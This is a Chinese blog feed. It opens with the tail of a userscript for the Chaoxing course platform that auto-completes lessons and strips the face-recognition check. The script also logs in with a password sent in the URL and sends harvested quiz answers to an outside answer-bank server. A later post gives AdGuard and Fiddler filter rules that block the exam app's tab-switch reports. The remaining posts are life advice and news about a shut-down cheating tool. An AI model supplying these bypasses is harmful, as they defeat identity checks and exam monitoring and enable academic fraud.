class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toNext</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> $cur = $(<span class="hljs-string">&#x27;#cur&#x27;</span> + $(<span class="hljs-string">&#x27;#chapterIdid&#x27;</span>).val()),<br>    $tip = $(<span class="hljs-string">&#x27;span.currents ~ span&#x27;</span>),<br>    sel = setting.review ? <span class="hljs-string">&#x27;html&#x27;</span> : <span class="hljs-string">&#x27;.blue&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (!$cur.has(sel).length &amp;&amp; $tip.length) <span class="hljs-keyword">return</span> $tip.eq(<span class="hljs-number">0</span>).click();<br>    $tip = $(<span class="hljs-string">&#x27;.roundpointStudent, .roundpoint&#x27;</span>).parent();<br>    $tip = $tip.slice($tip.index($cur) + <span class="hljs-number">1</span>).not(<span class="hljs-string">&#x27;:has(&#x27;</span> + sel + <span class="hljs-string">&#x27;)&#x27;</span>);<br>    $tip.not(setting.lock ? <span class="hljs-string">&#x27;:has(.lock)&#x27;</span> : <span class="hljs-string">&#x27;html&#x27;</span>).find(<span class="hljs-string">&#x27;span&#x27;</span>).eq(<span class="hljs-number">0</span>).click();<br>    $tip.length || setting.course &amp;&amp; switchCourse();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">switchCourse</span>(<span class="hljs-params"></span>) </span>&#123;<br>    GM_xmlhttpRequest(&#123;<br>        method: <span class="hljs-string">&#x27;GET&#x27;</span>,<br>        url: <span class="hljs-string">&#x27;/visit/courses/study?isAjax=true&amp;fileId=0&amp;debug=&#x27;</span>,<br>        headers: &#123;<br>            <span class="hljs-string">&#x27;Referer&#x27;</span>: location.origin + <span class="hljs-string">&#x27;/visit/courses&#x27;</span>,<br>            <span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span><br>        &#125;,<br>        onload: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> list = $(<span class="hljs-string">&#x27;h3 a[target]&#x27;</span>, xhr.responseText).map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">return</span> $(<span class="hljs-built_in">this</span>).attr(<span class="hljs-string">&#x27;href&#x27;</span>);<br>            &#125;),<br>            index = list.map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">index</span>) </span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.match(top.courseId) &amp;&amp; index;<br>            &#125;).filter(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">return</span> $.isNumeric(<span class="hljs-built_in">this</span>);<br>            &#125;)[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span> || <span class="hljs-number">0</span>;<br>            setting.course = list[index] ? goCourse(list[index]) : <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goCourse</span>(<span class="hljs-params">url</span>) </span>&#123;<br>    GM_xmlhttpRequest(&#123;<br>        method: <span class="hljs-string">&#x27;GET&#x27;</span>,<br>        url: url,<br>        onload: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr</span>) </span>&#123;<br>            $.globalEval(<span class="hljs-string">&#x27;location.href = &quot;&#x27;</span> + $(<span class="hljs-string">&#x27;.articlename a[href]&#x27;</span>, xhr.responseText).attr(<span class="hljs-string">&#x27;href&#x27;</span>) + <span class="hljs-string">&#x27;&quot;;&#x27;</span>);<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">autoRead</span>(<span class="hljs-params"></span>) </span>&#123;<br>    $(<span class="hljs-string">&#x27;html, body&#x27;</span>).animate(&#123;<br>        scrollTop: $(<span class="hljs-built_in">document</span>).height() - $(<span class="hljs-built_in">window</span>).height()<br>    &#125;, <span class="hljs-built_in">Math</span>.round(setting.read) * <span class="hljs-number">1E3</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        $(<span class="hljs-string">&#x27;.nodeItem.r i&#x27;</span>).click();<br>    &#125;).one(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-string">&#x27;#top&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) </span>&#123;<br>        $(event.delegateTarget).stop();<br>    &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">DisplayURL</span>(<span class="hljs-params"></span>) </span>&#123;<br>    _self.WAY.box.hide();<br>    <span class="hljs-keyword">var</span> $li = $(<span class="hljs-built_in">this</span>).closest(<span class="hljs-string">&#x27;li&#x27;</span>);<br>    $.get(<span class="hljs-string">&#x27;/visit/goToCourseByFace&#x27;</span>, &#123;<br>        courseId: $li.find(<span class="hljs-string">&#x27;input[name=courseId]&#x27;</span>).val(),<br>        clazzId: $li.find(<span class="hljs-string">&#x27;input[name=classId]&#x27;</span>).val()<br>    &#125;, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>        $li.find(<span class="hljs-string">&#x27;[onclick^=openFaceTip]&#x27;</span>).removeAttr(<span class="hljs-string">&#x27;onclick&#x27;</span>).attr(&#123;<br>            target: <span class="hljs-string">&#x27;_blank&#x27;</span>,<br>            href: $(data).filter(<span class="hljs-string">&#x27;script:last&#x27;</span>).text().match(<span class="hljs-regexp">/n\(&quot;(.+?)&quot;/</span>)[<span class="hljs-number">1</span>]<br>        &#125;);<br>        alert(<span class="hljs-string">&#x27;本课程已临时解除面部识别&#x27;</span>);<br>    &#125;, <span class="hljs-string">&#x27;html&#x27;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSchoolId</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> school = <span class="hljs-regexp">/^1\d&#123;10&#125;$/</span>.test(setting.username) ? <span class="hljs-string">&#x27;&#x27;</span> : setting.school;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isNaN</span>(school)) <span class="hljs-keyword">return</span> <span class="hljs-built_in">setTimeout</span>(toLogin, setting.time, school);<br>    <span class="hljs-keyword">if</span> (school == <span class="hljs-string">&#x27;账号为手机号可以不修改此参数&#x27;</span>) <span class="hljs-keyword">return</span> alert(<span class="hljs-string">&#x27;请修改school参数&#x27;</span>);<br>    $.getJSON(<span class="hljs-string">&#x27;/org/searchUnis?filter=&#x27;</span> + <span class="hljs-built_in">encodeURI</span>(school) + <span class="hljs-string">&#x27;&amp;product=44&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!data.result) <span class="hljs-keyword">return</span> alert(<span class="hljs-string">&#x27;学校查询错误&#x27;</span>);<br>        <span class="hljs-keyword">var</span> msg = $.grep(data.froms, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> value.name == school;<br>        &#125;)[<span class="hljs-number">0</span>];<br>        msg ? <span class="hljs-built_in">setTimeout</span>(toLogin, setting.time, msg.schoolid) : alert(<span class="hljs-string">&#x27;学校名称不完整&#x27;</span>);<br>    &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toLogin</span>(<span class="hljs-params">fid</span>) </span>&#123;<br>    GM_xmlhttpRequest(&#123;<br>        method: <span class="hljs-string">&#x27;GET&#x27;</span>,<br>        url: <span class="hljs-string">&#x27;/api/login?name=&#x27;</span> + setting.username + <span class="hljs-string">&#x27;&amp;pwd=&#x27;</span> + setting.password + <span class="hljs-string">&#x27;&amp;schoolid=&#x27;</span> + fid + <span class="hljs-string">&#x27;&amp;verify=0&#x27;</span>,<br>        onload: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> obj = $.parseJSON(xhr.responseText) || &#123;&#125;;<br>            obj.result ? location.href = <span class="hljs-built_in">decodeURIComponent</span>($(<span class="hljs-string">&#x27;#ref, #refer_0x001&#x27;</span>).val()) : alert(obj.errorMsg || <span class="hljs-string">&#x27;Error&#x27;</span>);<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">submitAnswer</span>(<span class="hljs-params">$job, data</span>) </span>&#123;<br>    $job.removeClass(<span class="hljs-string">&#x27;ans-job-finished&#x27;</span>);<br>    data = data.length ? $(data) : $(<span class="hljs-string">&#x27;.TiMu&#x27;</span>).map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> title = filterImg($(<span class="hljs-string">&#x27;.Zy_TItle .clearfix&#x27;</span>, <span class="hljs-built_in">this</span>));<br>        <span class="hljs-keyword">return</span> &#123;<br>            question: title.replace(<span class="hljs-regexp">/^【.*?】\s*/</span>, <span class="hljs-string">&#x27;&#x27;</span>),<br>            <span class="hljs-keyword">type</span>: (&#123;单选题: <span class="hljs-number">0</span>, 多选题: <span class="hljs-number">1</span>, 填空题: <span class="hljs-number">2</span>, 判断题: <span class="hljs-number">3</span>&#125;)[title.match(<span class="hljs-regexp">/^【(.*?)】|$/</span>)[<span class="hljs-number">1</span>]]<br>        &#125;;<br>    &#125;);<br>    data = $.grep(data.map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">index</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> $TiMu = $(<span class="hljs-string">&#x27;.TiMu&#x27;</span>).eq(index);<br>        <span class="hljs-keyword">if</span> (!($.isPlainObject(<span class="hljs-built_in">this</span>) &amp;&amp; <span class="hljs-built_in">this</span>.type &lt; <span class="hljs-number">4</span> &amp;&amp; $TiMu.find(<span class="hljs-string">&#x27;.fr&#x27;</span>).length)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.type == <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">var</span> $ans = $TiMu.find(<span class="hljs-string">&#x27;.Py_tk, .Py_answer&#x27;</span>).eq(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span> (!$TiMu.find(<span class="hljs-string">&#x27;.cuo&#x27;</span>).length &amp;&amp; <span class="hljs-built_in">this</span>.code) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!$ans.find(<span class="hljs-string">&#x27;.cuo&#x27;</span>).length) &#123;<br>                <span class="hljs-built_in">this</span>.option = $ans.find(<span class="hljs-string">&#x27;.clearfix&#x27;</span>).map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>                    <span class="hljs-keyword">return</span> $(<span class="hljs-built_in">this</span>).text().trim();<br>                &#125;).get().join(<span class="hljs-string">&#x27;#&#x27;</span>) || <span class="hljs-string">&#x27;无&#x27;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.code) &#123;<br>                <span class="hljs-built_in">this</span>.code = -<span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.type == <span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-keyword">var</span> ans = $TiMu.find(<span class="hljs-string">&#x27;.font20:last&#x27;</span>).text();<br>            <span class="hljs-keyword">if</span> ($TiMu.find(<span class="hljs-string">&#x27;.cuo&#x27;</span>).length) &#123;<br>                <span class="hljs-built_in">this</span>.option = (&#123;<span class="hljs-string">&#x27;√&#x27;</span>: <span class="hljs-string">&#x27;错误&#x27;</span>, <span class="hljs-string">&#x27;×&#x27;</span>: <span class="hljs-string">&#x27;正确&#x27;</span>&#125;)[ans] || <span class="hljs-string">&#x27;无&#x27;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.code) &#123;<br>                <span class="hljs-built_in">this</span>.option = (&#123;<span class="hljs-string">&#x27;√&#x27;</span>: <span class="hljs-string">&#x27;正确&#x27;</span>, <span class="hljs-string">&#x27;×&#x27;</span>: <span class="hljs-string">&#x27;错误&#x27;</span>&#125;)[ans] || <span class="hljs-string">&#x27;无&#x27;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">var</span> text = $TiMu.find(<span class="hljs-string">&#x27;.Py_answer &gt; span:eq(0)&#x27;</span>).text();<br>            <span class="hljs-keyword">if</span> ($TiMu.find(<span class="hljs-string">&#x27;.dui&#x27;</span>).length &amp;&amp; <span class="hljs-built_in">this</span>.code &amp;&amp; !<span class="hljs-regexp">/^A?B?C?D?E?F?G?$/</span>.test(<span class="hljs-built_in">this</span>.option)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($TiMu.find(<span class="hljs-string">&#x27;.dui&#x27;</span>).length || text.match(<span class="hljs-string">&#x27;正确答案&#x27;</span>)) &#123;<br>                text = text.match(<span class="hljs-regexp">/[A-G]/gi</span>) || [];<br>                <span class="hljs-built_in">this</span>.option = $.map(text, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) </span>&#123;<br>                    <span class="hljs-keyword">return</span> filterImg($TiMu.find(<span class="hljs-string">&#x27;.fl:contains(&#x27;</span> + value + <span class="hljs-string">&#x27;) + a&#x27;</span>));<br>                &#125;).join(<span class="hljs-string">&#x27;#&#x27;</span>) || <span class="hljs-string">&#x27;无&#x27;</span>;<br>                <span class="hljs-built_in">this</span>.key = text.join(<span class="hljs-string">&#x27;&#x27;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.code) &#123;<br>                <span class="hljs-built_in">this</span>.code = -<span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>    &#125;), <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> value &amp;&amp; value.option != <span class="hljs-string">&#x27;无&#x27;</span>;<br>    &#125;);<br>    setting.curs = $(<span class="hljs-string">&#x27;script:contains(courseName)&#x27;</span>, top.document).text().match(<span class="hljs-regexp">/courseName:\&#x27;(.+?)\&#x27;|$/</span>)[<span class="hljs-number">1</span>] || $(<span class="hljs-string">&#x27;h1&#x27;</span>).text().trim() || <span class="hljs-string">&#x27;无&#x27;</span>;<br>    data.length &amp;&amp; GM_xmlhttpRequest(&#123;<br>        method: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        url: <span class="hljs-string">&#x27;http://ydfq.52msr.cn/chati.php&#x27;</span>,<br>        headers: &#123;<br>            <span class="hljs-string">&#x27;Content-type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        &#125;,<br>        data: <span class="hljs-string">&#x27;question=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(setting.curs) + <span class="hljs-string">&#x27;&amp;data=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>((Ext.encode || <span class="hljs-built_in">JSON</span>.stringify)(data)) + <span class="hljs-string">&#x27;&amp;id=&#x27;</span> + $(<span class="hljs-string">&#x27;#jobid&#x27;</span>).val().slice(<span class="hljs-number">5</span>)<br>    &#125;);<br>    $job.addClass(<span class="hljs-string">&#x27;ans-job-finished&#x27;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterImg</span>(<span class="hljs-params">dom</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> $(dom).clone().find(<span class="hljs-string">&#x27;img[src]&#x27;</span>).replaceWith(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> $(<span class="hljs-string">&#x27;&lt;p&gt;&lt;/p&gt;&#x27;</span>).text(<span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span> + $(<span class="hljs-built_in">this</span>).attr(<span class="hljs-string">&#x27;src&#x27;</span>) + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>);<br>    &#125;).end().find(<span class="hljs-string">&#x27;iframe[src]&#x27;</span>).replaceWith(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> $(<span class="hljs-string">&#x27;&lt;p&gt;&lt;/p&gt;&#x27;</span>).text(<span class="hljs-string">&#x27;&lt;iframe src=&quot;&#x27;</span> + $(<span class="hljs-built_in">this</span>).attr(<span class="hljs-string">&#x27;src&#x27;</span>) + <span class="hljs-string">&#x27;&quot;&gt;&lt;/irame&gt;&#x27;</span>);<br>    &#125;).end().text().trim();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1>如果没有你所需要的答案，你可以把课程名发送到邮箱<a href="mailto:&#x6e;&#97;&#119;&#108;&#x67;&#x7a;&#115;&#x40;&#x31;&#54;&#x33;&#x2e;&#x63;&#x6f;&#x6d;">&#x6e;&#97;&#119;&#108;&#x67;&#x7a;&#115;&#x40;&#x31;&#54;&#x33;&#x2e;&#x63;&#x6f;&#x6d;</a><br>我们会尽快收录</li></ul><p>服务器费用有我个人承担，题库具体使用时长暂不确定。</p><p>服务器设置了安全策略，一分钟内访问12次以上就会触发。五分钟自动解封，惩罚规则是累计的</p><p><strong>此题库仅用于分享给大家免费使用，请勿用于商业用途！</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有哪些是因为年轻才会犯的错误？</title>
    <link href="/2020/05/41.html"/>
    <url>/2020/05/41.html</url>
    
    <content type="html"><![CDATA[<p>1、对人性有过高的期望。</p><p>年轻人总是容易对人性有不切实际的期望,比如谈一次恋爱，自己付出了，对对方真心了，对方就会有多珍惜自己。</p><p>比如以前帮个别人，等自己出事了就觉得对方一定会帮自己。比如对方答应了自己- -件事，就以为对方绝对不会变卦。因为期望不切实际，自然容易受伤。</p><p>一个人的受伤程度等于他的期望和现实的距离。</p><p>2、对爱情有过高的期望。</p><p>年轻人总觉得爱情有多么多么的神圣，总觉得爱情可以解决他们人生中的种种问题。</p><p>然而，真的把爱情解剖一下，你会发现爱情可以很俗。女人足够漂亮，走到哪里都是真爱。</p><p>男人足够牛逼，走到哪里都会得到女人的崇拜。爱情是锦上添花而不是雪中送炭，那些把爱情放在第一-位,放在自己前面的人，总是吃亏的一方，总是被人嘲笑,被另一半看不起的人，这是这个世界上最大的讽刺。</p><p>3、太急于求成。</p><p>每个年轻.人都做过逆袭上清华，翻身上北大的梦，然而真正脚踏实地，把每一堂课听懂，每个知识点掌握，不浪费每一分钟的人少之又少。</p><p>大家看:重的都是结果，忽略的都是过程。然而没有正确的过程，好的结果只能是黄粱一梦。</p><p>4、喜欢怼人，和别人杠，纠缠。</p><p>年轻的时候，针尖对麦芒，别人说-句不开心的话就摆在脸.上。</p><p>别人说你一-句不是，你就要辩解回来。然而却不知道，老是做无畏的纠缠，只是暴露了自己缺少底气的沉稳。</p><p>5、不珍惜时间。</p><p>年轻的时候，真的不知道时间的宝贵，可以一觉睡到大中午，可以把大把的时间浪费在电子游戏上而不觉得心疼。</p><p>等到工作了，才发现，时间是如此的稀缺,如果把以前浪费的时间用来提升自己，自己可以变得多么优秀!</p><p>6、没有规划。</p><p>不仅仅不知道自己想做什么，很多人根本没有去思考这个问题，就是随波逐流，看别人考研就考研，看别人去考公务员就也凑个热闹。</p><p>于是他们不了解自己也不了解这个社会，等着出了社会，他们面临的是一-个又- -个坑,一条又- 条的弯路。很大一部分人的青春就浪费在弯路上了，等回过神来，青春已经过去了。</p><p>7、太重视利益,太轻视情义。</p><p>不少年轻人为了成功，为了资源，混迹于各个圈子，和各种成功人士在一起。然而他们忽视了和他们一-起吃，-起住的同窗，同龄的好友。</p><p>人生匆匆，如白驹过隙，你会发现，钱并不稀罕，可贵的是超越物质的情义。个只认利益的人是难以成大器的，因为关键的时候，他没有靠得住的人可以仰仗，没有可以不计较利益同舟共济的人。</p><p>8、对选择太过轻率。</p><p>在选择学校的时候，选择专业的时候，选择第一份工作的时候，选择另-半的时候，这些关乎你一辈子道路的选择上，年轻人实在是太过轻率，大部分人都是拍着自己的脑子就选择了，靠感觉就选了，没有做过任何细致的调研，也没有去咨询一下过来人，如此，选错才是大概率事件。很多事情- - 旦选错，就回不了头了。</p><p>9、藏不住事情。</p><p>遇到别人一点点温暖，及没有防备的倾诉，什么话都说，以为别人的关系和你有多好。</p><p>殊不知，你今天刚把秘密告诉别人，第二天就所有人都知道了。做人需要城府，需要能胸中藏得住秘密，这样才称得上沉稳，称得上成熟。</p>]]></content>
    
    
    
    <tags>
      
      <tag>daily</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>拦截数据包实现超星学习通APP考试安全切屏（新）</title>
    <link href="/2020/05/40.html"/>
    <url>/2020/05/40.html</url>
    
    <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul><li>适用平台：Android、iOS（未测试）</li><li>安装软件：AdGuard（Android）/ Fiddler（Win）</li><li>实现功能：超星学习通考试切屏（离开考试）记录不上报，老师端无记录。</li><li>底层原理：拦截数据包。</li></ul><p><strong>网页考试不存在任何检测，本文只针对客户端研究。</strong></p><blockquote><p>本文没什么技术含量，都是软件的基本操作。<br><code>请注意：可能超星更新了更多反人类的检测，所以在正式考试之前务必自行建课测试。</code></p></blockquote><p>由于学习通App考试页面为内嵌WebView，协议均为HTTP/HTTPS，于是我们可以很方便的使用代理/VPN方式拦截考试切屏上报请求，从而达到不可描述的目的。</p><a id="more"></a><p>[6月28日更新]<br>今天测试新版考试系统发现新增了上报接口<br><img src="https://ae01.alicdn.com/kf/Ha5502212438a4b1999002996aad5e955b.jpg" srcset="/img/loading.gif" lazyload alt="11"><br>所以过滤规则需加上 <code>receiveExamLogs?eventType=3 receiveExamLogs?eventType=4</code></p><p>此处<code>eventType=1/2</code>未知，目测是上报作答记录和拍照采集之类，只需要拦截<code>eventType=3/4</code>的切屏上报即可</p><p>推荐使用iOS系统+Fiddler拦截，因为安卓7.0以上系统用户证书不被信任，HTTPS无法拦截，root可能比较繁琐或无法成功。</p><p><a href="https://blog.csdn.net/lylfv/article/details/87605997">iOS安装证书+配置教程点此</a></p><p>Fiddler设置：<code>receiveExamLogs?eventType=3 receiveExamLogs?eventType=4 exit-count</code><br><img src="https://ae01.alicdn.com/kf/H9597154c6bbc4b07a23a72ec36e3fb0f0.jpg" srcset="/img/loading.gif" lazyload alt="12"><br><img src="https://ae01.alicdn.com/kf/H2aec5d285a2e456991cd6847099a7609h.jpg" srcset="/img/loading.gif" lazyload alt="13"></p><h1 id="使用AdGuard拦截"><a href="#使用AdGuard拦截" class="headerlink" title="使用AdGuard拦截"></a>使用AdGuard拦截</h1><ul><li>安装AdGuard、安装HTTPS证书<br><img src="https://ae01.alicdn.com/kf/Hfe2558a7c81f43d38271f596af451f6fK.jpg" srcset="/img/loading.gif" lazyload alt="1"><br><img src="https://ae01.alicdn.com/kf/H8ac79b51ea5e4738bee3013f5e2602f8k.jpg" srcset="/img/loading.gif" lazyload alt="2"></li><li>配置过滤规则<br>左上角菜单 → 设置 → 内容拦截 → User Rules → 右下角+<br><img src="https://ae01.alicdn.com/kf/H5be56d09e48c4e7587da90da29dd5e86l.jpg" srcset="/img/loading.gif" lazyload alt="3"><br><img src="https://ae01.alicdn.com/kf/H9ae5fdbe0a9d475380ea96d730fbd322M.jpg" srcset="/img/loading.gif" lazyload alt="4"><br><img src="https://ae01.alicdn.com/kf/Hae8f82a543cc4963a90b1558cda59c8dF.jpg" srcset="/img/loading.gif" lazyload alt="5"><br><img src="https://ae01.alicdn.com/kf/H2336a692b5834404ac7dd4a51234926aO.jpg" srcset="/img/loading.gif" lazyload alt="6"><br><img src="https://ae01.alicdn.com/kf/Hee330d1b0b3d4b77af76a67ab5b616fcc.jpg" srcset="/img/loading.gif" lazyload alt="7"><br><img src="https://ae01.alicdn.com/kf/H952148e43adc43aeb0cf76dab3a154f5m.jpg" srcset="/img/loading.gif" lazyload alt="8"><br>输入过滤规则：<code>||mooc1-api.chaoxing.com/exam/phone/exit-count^</code></li><li>开启保护<br>右上角出现钥匙图标即可<br><img src="https://ae01.alicdn.com/kf/H9130770cce2841ca94ef660dfdd4c7798.jpg" srcset="/img/loading.gif" lazyload alt="9"></li><li>实测效果<br><img src="https://ae01.alicdn.com/kf/Ha2c5647887594ced927ee71475a0e123F.jpg" srcset="/img/loading.gif" lazyload alt="10"><br><img src="https://ae01.alicdn.com/kf/He13f0697f032427d9e140b677f224d113.jpg" srcset="/img/loading.gif" lazyload alt="11"></li></ul><h1 id="使用Fiddler拦截"><a href="#使用Fiddler拦截" class="headerlink" title="使用Fiddler拦截"></a>使用Fiddler拦截</h1><ul><li>安装Fiddler，生成HTTPS证书，手机安装Fidder生成的HTTPS证书，手机WIFI设置HTTP代理服务器为电脑IP<blockquote><p>基本操作此处不赘述,自行百度</p></blockquote></li><li>设置滤器规则，设置断点模式<br><code>exit-count</code><br><img src="https://ae01.alicdn.com/kf/H6923f6a779ba463a918011e0eabdeeb6P.jpg" srcset="/img/loading.gif" lazyload alt="12"><br>图中可看到切屏上报请求已被拦截。</li></ul><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>拦截切屏上报后依旧会出现提醒，无需担心。<br><img src="https://ae01.alicdn.com/kf/H42a0d7e18cfb44788888f30fa5b6ac50J.jpg" srcset="/img/loading.gif" lazyload alt="13"></p><h1 id="原文出处"><a href="#原文出处" class="headerlink" title="原文出处"></a>原文出处</h1><p><a href="http://www.zhmd5.com/a/51/">拦截数据包实现超星学习通APP考试安全切屏</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>超星慕课小助手(cxmooc-tools)跑路 - 互联网怎么了？</title>
    <link href="/2020/04/39.html"/>
    <url>/2020/04/39.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>就在上周六，大学生一代的神器作者宣布停止脚本维护并且关停题库服务器。<br>不排除校领导钓鱼提问！！然后禁止抬杠！不要道德绑架！超星的网课什么水平，大家看不看自己心里肯定有数。看到这个声名的时候，我第一反应是 woc我捐钱！我给钱！求你了！类比pd吧，超星网课助手从大一陪伴到我即将考研，每当我教给别人怎么用这两个软件的时候，“牛逼啊！X哥！”之类的话也随之而来。说实话我接触脚本也是从这两个软件开始的，到现在装了很多便利的脚本。“清爽助手”“xx会员”“Bxlx下载”“护眼”等等。借用开发者的结尾吧，“送君千里，终须一别。今日的分别是为了明日更好的相聚。江湖再见“</p></blockquote><a id="more"></a><p>原文链接：<a 